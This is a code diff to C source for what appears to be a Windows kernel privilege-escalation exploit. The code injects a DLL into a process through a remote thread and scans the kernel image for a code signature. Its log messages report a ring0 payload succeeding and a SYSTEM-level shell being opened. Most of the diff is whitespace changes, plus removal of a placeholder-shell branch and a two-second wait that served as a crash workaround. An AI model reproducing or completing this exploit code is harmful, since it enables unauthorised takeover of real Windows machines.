@@ -115,11 +115,11 @@ int main(int argc, char **argv)
     HANDLE VdmHandle;
     HANDLE RemoteThread;
     DWORD ShellPid = 0;
-    DWORD KillPid = 0;
+	DWORD KillPid = 0;
     DWORD ThreadCode;
     DWORD KernelBase;
-    TCHAR VDMPath[_MAX_PATH];
-    TCHAR CMDPath[_MAX_PATH];
+	TCHAR VDMPath[_MAX_PATH];
+	TCHAR CMDPath[_MAX_PATH];
     CHAR Buf[32];
     DWORD Offset;
 
@@ -148,22 +148,7 @@ int main(int argc, char **argv)
             LogMessage(L_ERROR, "PrepareProcessForSystemToken() returned failure");
 		    goto finished;
         }
-	} else {
-
-        // Spawn the process as a placeholder, no idea why this is needed yet (BSOD w/o).
-        LogMessage(L_INFO, "Spawning a shell to make the process happy (ignore this)");
-
-        if (PrepareProcessForSystemToken(CMDPath, &ShellPid) != TRUE) {
-            LogMessage(L_ERROR, "PrepareProcessForSystemToken() returned failure");
-		    goto finished;
-        }
-		KillPid = ShellPid;
-        ShellPid = atoi(argv[1]);
 	}
-
-    // Dance around a consistent BSOD if we don't wait
-    LogMessage(L_INFO, "Waiting two seconds while the child process initializes...");
-    Sleep(2000);
 
     // Scan kernel image for the required code sequence, and find the base address.
     if (ScanForCodeSignature(&KernelBase, &Offset) == FALSE) {
@@ -192,10 +177,12 @@ int main(int argc, char **argv)
         goto finished;
     }
 
+
     // Wait for the thread to complete
     LogMessage(L_DEBUG, "WaitForSingleObject(%#x, INFINITE);", RemoteThread);
 
     WaitForSingleObject(RemoteThread, INFINITE);
+
 
     // I pass some information back via the exit code to indicate what happened.
     GetExitCodeThread(RemoteThread, &ThreadCode);
@@ -235,7 +222,7 @@ int main(int argc, char **argv)
         case 'w00t':
             // This means the exploit payload was executed at ring0 and succeeded.
             LogMessage(L_INFO, "The exploit thread reports exploitation was successful");
-            if(! KillPid)
+			if(! KillPid)
                 LogMessage(L_INFO, "w00t! You can now use the shell opened earlier");
             break;
         default:
@@ -359,6 +346,7 @@ static BOOL InjectDLLIntoProcess(PCHAR DllPath, HANDLE ProcessHandle, PHANDLE Re
                                        RemotePage,
                                        0,
                                        NULL);
+	CloseHandle(ProcessHandle);
 
     return *RemoteThread != NULL;
 }
